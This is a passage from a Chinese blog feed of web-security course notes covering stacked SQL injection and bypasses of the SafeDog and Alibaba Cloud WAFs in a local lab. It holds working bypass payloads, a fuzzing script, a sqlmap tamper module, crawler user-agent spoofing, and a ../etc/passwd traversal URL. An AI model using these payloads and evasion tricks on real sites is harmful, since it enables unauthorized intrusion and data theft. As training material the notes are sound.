‘a’substr(‘abc’ from 1 for 1) = ‘a’substring(‘abc’,1,1) = ‘a’substring(‘abc’ from 1 for 1) = ‘a’mid(‘abc’,1,1) = ‘a’mid(‘abc’ from 1 for 1) = ‘a’lpad(‘abc’,1,space(1)) = ‘a’rpad(‘abc’,1,space(1)) = ‘a’left(‘abc’,1) = ‘a’reverse(right(reverse(‘abc’),1)) = ‘a’insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’space(0) = trim(version()from(version()))#搜索子字符串locate(‘a’,'</span>abc’<span class="token punctuation">)</span>position<span class="token punctuation">(</span>‘a’,<span class="token string">'abc’)position(‘a’ IN ‘abc’)instr(‘abc’,'</span>a’<span class="token punctuation">)</span>substring_index<span class="token punctuation">(</span>‘ab’,<span class="token string">'b’,1)#分割字符串length(trim(leading ‘a’ FROM ‘abc’))length(replace(‘abc’, ‘a’, ”))#比较字符串strcmp(‘a’,'</span>a’<span class="token punctuation">)</span>mod<span class="token punctuation">(</span>‘a’,<span class="token string">'a’)find_in_set(‘a’,'</span>a’<span class="token punctuation">)</span>field<span class="token punctuation">(</span>‘a’,<span class="token string">'a’)count(concat(‘a’,'</span>a’<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#字符串长度</span>length<span class="token punctuation">(</span><span class="token punctuation">)</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span>char_length<span class="token punctuation">(</span><span class="token punctuation">)</span>octet_length<span class="token punctuation">(</span><span class="token punctuation">)</span>bit_count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#关键字过滤</span>Connected keyword filtering<span class="token punctuation">(</span>0<span class="token punctuation">)</span>union<span class="token punctuation">(</span>select<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>,column_name,…0/**/union/*<span class="token operator">!</span>50000select*/table_name<span class="token variable"><span class="token variable">`</span>foo<span class="token variable">`</span></span>/**/…0%a0union%a0select%09group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>….0′union all <span class="token keyword">select</span> all<span class="token variable"><span class="token variable">`</span>table_name<span class="token variable">`</span></span>foo from<span class="token variable"><span class="token variable">`</span>information_schema<span class="token variable">`</span></span><span class="token keyword">.</span> <span class="token variable"><span class="token variable">`</span>tables<span class="token variable">`</span></span><span class="token comment" spellcheck="true">#控制流</span><span class="token keyword">case</span> ‘a’ when ‘a’ <span class="token keyword">then</span> 1 <span class="token punctuation">[</span>else 0<span class="token punctuation">]</span> end<span class="token keyword">case</span> when ‘a’<span class="token operator">=</span><span class="token string">'a’ then 1 [else 0] endif(‘a’='</span>a’,1,0<span class="token punctuation">)</span>ifnull<span class="token punctuation">(</span>nullif<span class="token punctuation">(</span>‘a’,'a’<span class="token punctuation">)</span>,1<span class="token punctuation">)</span></code></pre><h3 id="五、小迪课程"><a href="#五、小迪课程" class="headerlink" title="五、小迪课程"></a><font size="5"><strong>五、小迪课程</strong></font></h3><p><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/6.png"></p><h4 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a><font size="4"><strong>案例演示</strong></font></h4><p>● 简要其他绕过方式学习<br>● FUZZ绕过脚本结合编写测试<br>● 阿里云盾防SQL注入简要分析<br>● 安全狗+云盾SQL注入插件脚本编写</p><pre class=" language-bash"><code class="language-bash">%23x%20union%23x%0Aselect%201,2,3%20union%20/*<span class="token operator">!</span>44509select*/%201,2,3%20/*<span class="token operator">!</span>44509union*/%23x%0aselect%201,1,2,3id<span class="token operator">=</span>1/**<span class="token operator">&amp;</span>id<span class="token operator">=</span>-1%20union%20select%201,2,3%23*/%20union%20all%23%0a%20select%201,2,3%23</code></pre><p><strong>方式一:IP白名单</strong><br>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造Ip绕过的情况。<br>测试方法:修改nttp的header来bypass waf</p><pre class=" language-bash"><code class="language-bash">x-forwarded-forx-remote-IPx-originating-工Px-remote-addrx-Real-ip</code></pre><p><strong>方式二:静态资源</strong><br>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制,waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p><pre class=" language-bash"><code class="language-bash">http://10.s.9.201/sql.php ?id<span class="token operator">=</span>1http://10.9.9.201/sql.php/1.j<span class="token operator">=</span>?id<span class="token operator">=</span>1</code></pre><p>备注: aapx&#x2F;php只识别到前面的.aspx&#x2F; .php后面基本不识别</p><p><strong>方式三:url白名单</strong><br>为了防止误拦，部分waf内置默认的白名单列表，如acmin&#x2F;managerl system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的uzl构造姿势:</p><pre class=" language-bash"><code class="language-bash">http://10.s.s.201/<span class="token operator">=</span>ql.php/admin.php?id<span class="token operator">=</span>1http://10.9.9.201/sql.php?a<span class="token operator">=</span>/manage/<span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token punctuation">..</span>/etc/passwdhttp://10.9.s.201/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/manage/<span class="token punctuation">..</span>/sql.asp?id<span class="token operator">=</span>2</code></pre><p>waf通过&#x2F;manage&#x2F;“进行比较，只要uri中存在&#x2F;manage&#x2F;就作为白名单不进行检测，这样我们可以通过&#x2F;sql.php?a&#x3D;&#x2F; manage&#x2F;&amp;b&#x3D;..&#x2F;etc&#x2F;passwcl绕过防御规则。</p><h4 id="fuzz代码实现"><a href="#fuzz代码实现" class="headerlink" title="fuzz代码实现"></a><font size="4"><strong>fuzz代码实现</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> requests, <span class="token function">time</span>url <span class="token operator">=</span> <span class="token string">'http://10.1.1.120/Less-2/?id=1'</span>union <span class="token operator">=</span> <span class="token string">'union'</span><span class="token keyword">select</span> <span class="token operator">=</span> <span class="token string">'select'</span>num <span class="token operator">=</span> <span class="token string">'1,2,3'</span>a <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;'%0a', '%23'&amp;#125;</span>aa <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;'x'&amp;#125;</span>aaa <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;'%0a', '%23'&amp;#125;</span>b <span class="token operator">=</span> <span class="token string">'/*!'</span>c <span class="token operator">=</span> <span class="token string">'/*'</span>def bypass<span class="token punctuation">(</span><span class="token punctuation">)</span>:    <span class="token keyword">for</span> xiaodi <span class="token keyword">in</span> a:        <span class="token keyword">for</span> xiaodis <span class="token keyword">in</span> aa:            <span class="token keyword">for</span> xiaodiss <span class="token keyword">in</span> aaa:                <span class="token keyword">for</span> two <span class="token keyword">in</span> range<span class="token punctuation">(</span>44500, 44600<span class="token punctuation">)</span>:                    urls <span class="token operator">=</span> url + xiaodi + xiaodis + xiaodiss + b + str<span class="token punctuation">(</span>two<span class="token punctuation">)</span> + union + c + xiaodi + xiaodis + xiaodiss + <span class="token keyword">select</span> + xiaodi + xiaodis + xiaodiss + num                    try:                        result <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>urls<span class="token punctuation">)</span>.text                        len_r <span class="token operator">=</span> len<span class="token punctuation">(</span>result<span class="token punctuation">)</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>result.find<span class="token punctuation">(</span><span class="token string">'safedog'</span><span class="token punctuation">)</span> <span class="token operator">==</span> -1<span class="token punctuation">)</span>:                            <span class="token comment" spellcheck="true"># print('bypass url address:'+ urls+'|'+ str(len_r))</span>                            print<span class="token punctuation">(</span><span class="token string">'bypass url address:'</span> + urls + <span class="token string">'|'</span> + str<span class="token punctuation">(</span>len_r<span class="token punctuation">))</span>                            <span class="token keyword">if</span> len_r <span class="token operator">==</span> 715:                                fp <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'url,txt'</span>, <span class="token string">'a+'</span><span class="token punctuation">)</span>                                fp.write<span class="token punctuation">(</span>urls + <span class="token string">'\n'</span><span class="token punctuation">)</span>                                fp.close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    except Exception as err:                        print<span class="token punctuation">(</span><span class="token string">'connecting error'</span><span class="token punctuation">)</span>                        time.sleep<span class="token punctuation">(</span>0.1<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token keyword">:</span>    print<span class="token punctuation">(</span><span class="token string">'fuzz start'</span><span class="token punctuation">)</span>    bypass<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行结果<br><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/7.png"><br><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/8.png"></p><h4 id="SQLmap-tamper"><a href="#SQLmap-tamper" class="headerlink" title="SQLmap tamper"></a><font size="4"><strong>SQLmap tamper</strong></font></h4><p>参考资料;<a href="https://www.cnblogs.com/mark0/p/12349551.html">https://www.cnblogs.com/mark0/p/12349551.html</a></p><p>在tamper文件夹中创建rdog.py</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token string">""</span><span class="token string">"Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"</span><span class="token string">""</span><span class="token function">import</span> refrom lib.core.data <span class="token function">import</span> kbfrom lib.core.enums <span class="token function">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY.NORMALdef dependencies<span class="token punctuation">(</span><span class="token punctuation">)</span>:    passdef tamper<span class="token punctuation">(</span>payload, **kwargs<span class="token punctuation">)</span>:    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload:        retVal <span class="token operator">=</span> retVal.replace<span class="token punctuation">(</span><span class="token string">'UNION'</span>, <span class="token string">'uNiOn/*/%0a*a*/'</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> retVal.replace<span class="token punctuation">(</span><span class="token string">'DATABASE()'</span>, <span class="token string">'dataBase/*!(*/)'</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> retVal.replace<span class="token punctuation">(</span><span class="token string">'DATABASE()'</span>, <span class="token string">'dataBase%23a%0a'</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> retVal.replace<span class="token punctuation">(</span><span class="token string">'USER()'</span>, <span class="token string">'usEr/*!(*/)'</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> retVal.replace<span class="token punctuation">(</span><span class="token string">' '</span>, <span class="token string">'/**/'</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> retVal.replace<span class="token punctuation">(</span><span class="token string">" "</span>, <span class="token string">'%23a%0a'</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> retVal.replace<span class="token punctuation">(</span><span class="token string">'OR'</span>, <span class="token string">'/*!14400Or*/'</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> retVal.replace<span class="token punctuation">(</span><span class="token string">'AND'</span>, <span class="token string">'/*!14400aNd*/'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal</code></pre><p><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/9.png"></p><p>可以看到的是代码并没有按照我们预期执行，我们添加代理看看到底是个什么情况<br>python sqlmap.py -u “<a href="http://10.1.1.120/Less-2/?id=1">http://10.1.1.120/Less-2/?id=1</a>“ –tamper&#x3D;rdog.py –proxy&#x3D;<a href="http://10.1.1.2:8888启动burp">http://10.1.1.2:8888启动burp</a><br><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/10.png"><br><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/11.png"></p><p>可以看到user-agent是sqlmap&#x2F;1.5.6.4#dev (<a href="http://sqlmap.org),安全软件当中是禁止使用这种脚本客户端所以就被拦截,自然插件脚本也就没办法正常执行/">http://sqlmap.org)，安全软件当中是禁止使用这种脚本客户端所以就被拦截，自然插件脚本也就没办法正常执行</a><br><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/12.png"><br><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/13.png"></p><p>最终找到漏洞</p><p>备注：在真实环境当中waf可能会配置流量访问也就是说你访问的速度过快会将你访问的ip拉入黑名单，对此我们使用的策略是延时，代理，爬虫白名单<br>搜索引擎爬虫user-agent信息：<a href="https://blog.csdn.net/liuxl57805678/article/details/89378720">https://blog.csdn.net/liuxl57805678/article/details/89378720</a></p><p>自定义user-agent</p><pre class=" language-bash"><code class="language-bash">python sqlmap.py -u <span class="token string">"http://10.1.1.120/Less-2/?id=1"</span>  --tamper<span class="token operator">=</span>rdog.py --proxy<span class="token operator">=</span>http://10.1.1.2:8888 --user-agent<span class="token operator">=</span><span class="token string">"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"</span></code></pre><p><img src="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/14.png"></p><p>延时注入<br>–delay 时间（默认为秒）</p><pre class=" language-bash"><code class="language-bash">C:\Users\admin\Desktop\security\software\sqlmapproject-sqlmap-7c41967<span class="token operator">></span>python sqlmap.py -u <span class="token string">"http://10.1.1.120/Less-2/?id=1"</span>  --tamper<span class="token operator">=</span>rdog.py --proxy<span class="token operator">=</span>http://10.1.1.2:8888 --delay 1        ___       __H__ ___ ___<span class="token punctuation">[</span><span class="token string">']_____ ___ ___  &amp;#123;1.5.6.4#dev&amp;#125;|_ -| . [)]     | .'</span><span class="token operator">|</span> <span class="token keyword">.</span> <span class="token operator">|</span><span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span><span class="token punctuation">)</span><span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   http://sqlmap.org<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 17:28:14 /2021-07-27/[17:28:16] [INFO] loading tamper module '</span>rdog'</code></pre><h3 id="六、网络资源"><a href="#六、网络资源" class="headerlink" title="六、网络资源"></a><font size="5"><strong>六、网络资源</strong></font></h3><p><a href="https://www.cnblogs.com/cute-puli/p/11146625.html">https://www.cnblogs.com/cute-puli/p/11146625.html</a><br><a href="https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html">https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-018</title>
      <link href="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/"/>
      <url>/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-堆叠及WAF绕过注入"><a href="#WEB漏洞-堆叠及WAF绕过注入" class="headerlink" title="WEB漏洞-堆叠及WAF绕过注入"></a><font size="6"><strong>WEB漏洞-堆叠及WAF绕过注入</strong></font></h2><span id="more"></span><h3 id="一、堆叠查询注入"><a href="#一、堆叠查询注入" class="headerlink" title="一、堆叠查询注入"></a><font size="5"><strong>一、堆叠查询注入</strong></font></h3><p>stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span> <span class="token keyword">select</span> * from emails<span class="token punctuation">;</span>+----+----------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password   <span class="token operator">|</span>+----+----------+------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angelina <span class="token operator">|</span> I-kill-you <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy    <span class="token operator">|</span> p@ssword   <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure   <span class="token operator">|</span> crappy     <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid   <span class="token operator">|</span> stupidity  <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman <span class="token operator">|</span> genious    <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman   <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin    <span class="token operator">|</span> 123456     <span class="token operator">|</span><span class="token operator">|</span>  9 <span class="token operator">|</span> admin1   <span class="token operator">|</span> admin1     <span class="token operator">|</span><span class="token operator">|</span> 10 <span class="token operator">|</span> admin2   <span class="token operator">|</span> admin2     <span class="token operator">|</span><span class="token operator">|</span> 11 <span class="token operator">|</span> admin3   <span class="token operator">|</span> admin3     <span class="token operator">|</span><span class="token operator">|</span> 12 <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo      <span class="token operator">|</span><span class="token operator">|</span> 14 <span class="token operator">|</span> admin4   <span class="token operator">|</span> admin4     <span class="token operator">|</span><span class="token operator">|</span> 15 <span class="token operator">|</span> admin'<span class="token comment" spellcheck="true">#  | admin      |</span>+----+----------+------------+14 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>+----+------------------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> email_id               <span class="token operator">|</span>+----+------------------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb@dhakkan.com       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angel@iloveu.com       <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy@dhakkan.local    <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure@dhakkan.local   <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid@dhakkan.local   <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman@dhakkan.local <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman@dhakkan.local   <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin@dhakkan.com      <span class="token operator">|</span>+----+------------------------+8 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p>修改代码在前台上面显示</p><pre class=" language-bash"><code class="language-bash"> 46 <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span> 47 <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span> 48 /* execute multi query */^M 49 <span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span> 50 <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span> 51      52      53     /* store first result <span class="token keyword">set</span> */^M 54     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> mysqli_store_result<span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">))</span></code></pre><p>执行代码,访问网站</p><pre class=" language-bash"><code class="language-bash">http://10.1.1.133/Less-38/index.php?id<span class="token operator">=</span>1 <span class="token string">';insert into users(id,username,password) values ( 39, '</span>less38 <span class="token string">', '</span>hello '<span class="token punctuation">)</span>--+</code></pre><p><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/1.png"></p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>+----+----------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password   <span class="token operator">|</span>+----+----------+------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb       <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> Angelina <span class="token operator">|</span> I-kill-you <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> Dummy    <span class="token operator">|</span> p@ssword   <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> secure   <span class="token operator">|</span> crappy     <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> stupid   <span class="token operator">|</span> stupidity  <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> superman <span class="token operator">|</span> genious    <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> batman   <span class="token operator">|</span> mob<span class="token operator">!</span>le     <span class="token operator">|</span><span class="token operator">|</span>  8 <span class="token operator">|</span> admin    <span class="token operator">|</span> 123456     <span class="token operator">|</span><span class="token operator">|</span>  9 <span class="token operator">|</span> admin1   <span class="token operator">|</span> admin1     <span class="token operator">|</span><span class="token operator">|</span> 10 <span class="token operator">|</span> admin2   <span class="token operator">|</span> admin2     <span class="token operator">|</span><span class="token operator">|</span> 11 <span class="token operator">|</span> admin3   <span class="token operator">|</span> admin3     <span class="token operator">|</span><span class="token operator">|</span> 12 <span class="token operator">|</span> dhakkan  <span class="token operator">|</span> dumbo      <span class="token operator">|</span><span class="token operator">|</span> 14 <span class="token operator">|</span> admin4   <span class="token operator">|</span> admin4     <span class="token operator">|</span><span class="token operator">|</span> 15 <span class="token operator">|</span> admin'<span class="token comment" spellcheck="true">#  | admin      |</span><span class="token operator">|</span> 38 <span class="token operator">|</span> less38   <span class="token operator">|</span> hello      <span class="token operator">|</span>+----+----------+------------+15 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p>备注：堆叠注入的可以运用于创建用户由于我们使用网站用户进行注入不能查看到数据库的密码但是我们可以创建用户来登录迂回的注入数据库，但是前提是网站的管理员必须是高权限才能完全创建用户。也可以使用update更新管理员用户密码。</p><h3 id="二、waf部署"><a href="#二、waf部署" class="headerlink" title="二、waf部署"></a><font size="5"><strong>二、waf部署</strong></font></h3><p><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/2.png"><br>WAF部署-安全狗,宝塔等waf搭建部署</p><p>相关资源：<br>堆叠注入<br><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a><br>安全狗与phpstudy<br><a href="https://blog.csdn.net/nzjdsds/article/details/93740686">https://blog.csdn.net/nzjdsds/article/details/93740686</a></p><h3 id="三、部署安全狗"><a href="#三、部署安全狗" class="headerlink" title="三、部署安全狗"></a><font size="5"><strong>三、部署安全狗</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># wget http://download.safedog.cn/safedog_linux64.tar.gz</span></code></pre><p>备注：一般安装的时候可能会提示一些软件没有安装，只需要按照他提示的软件安装上即可。<br>安装好之后可以在命令提示符中执行以下命令</p><pre class=" language-bash"><code class="language-bash">root@37f786327043:/<span class="token comment" spellcheck="true"># service safedog start</span>root@37f786327043:/<span class="token comment" spellcheck="true"># service safedog status</span>safedog <span class="token function">service</span> is runningroot@37f786327043:/<span class="token comment" spellcheck="true"># service safedog stop</span>-e stop sdsvrd server <span class="token comment" spellcheck="true">#/etc/init.d/safedog: 45: [: &amp;#123;1..15&amp;#125;: unexpected operator</span>root@37f786327043:/<span class="token comment" spellcheck="true"># service safedog stop</span>-e stop sdsvrd server <span class="token comment" spellcheck="true">#/etc/init.d/safedog: 45: [: &amp;#123;1..15&amp;#125;: unexpected operator</span>root@37f786327043:/<span class="token comment" spellcheck="true"># service safedog status</span>safedog serivce is not runningroot@37f786327043:/<span class="token comment" spellcheck="true">#</span></code></pre><p>访问网站后面带一些参数例如’ and 1&#x3D;1<br><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/3.png"></p><p>通过更改数据提交方式，测试后发现上面显示的Please input the ID as parameter with numeric value 其实就是因为我们修改的方式是post而服务器接收的是get方法将数据包丢弃，所以出现这样的情况<br><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/4.png"></p><h4 id="将服务器的提交方式修改为request"><a href="#将服务器的提交方式修改为request" class="headerlink" title="将服务器的提交方式修改为request"></a><font size="4"><strong>将服务器的提交方式修改为request</strong></font></h4><pre class=" language-bash"><code class="language-bash">root@37f786327043:/var/www/html/Less-2<span class="token comment" spellcheck="true"># head -n 24 index.php |tail -3</span>if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/5.png"></p><p>获取数据库版本信息被安全狗给拦截<br><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/6.png"></p><p>绕过思路,这是mysql数据库所特有的</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> database/**/<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>+-------------+<span class="token operator">|</span> database <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span>+-------------+<span class="token operator">|</span> security    <span class="token operator">|</span>+-------------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/7.png"></p><h4 id="将服务器的提交方式修改为GET"><a href="#将服务器的提交方式修改为GET" class="headerlink" title="将服务器的提交方式修改为GET"></a><font size="4"><strong>将服务器的提交方式修改为GET</strong></font></h4><pre class=" language-bash"><code class="language-bash">root@37f786327043:/var/www/html/Less-2<span class="token comment" spellcheck="true"># head -n 24 index.php |tail -3</span>if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>root@37f786327043:/var/www/html/Less-2<span class="token comment" spellcheck="true">#</span></code></pre><p><img src="/2023/10/01/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-018/8.png"></p><p>原理</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where id<span class="token operator">=</span>-1/*%0a*/union/*%0a*/select/*%0a*/1,2,3<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> 2        <span class="token operator">|</span> 3        <span class="token operator">|</span>+----+----------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p>在看视频操作的时候，由于我部署的是Linux的2.4版本很多的绕过方法都没有成功，下面不在演示，等到复习的时候在深入了解。</p><h3 id="四、相关资源："><a href="#四、相关资源：" class="headerlink" title="四、相关资源："></a><font size="5"><strong>四、相关资源：</strong></font></h3><p><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a><br><a href="https://blog.csdn.net/nzjdsds/article/details/93740686">https://blog.csdn.net/nzjdsds/article/details/93740686</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-017</title>
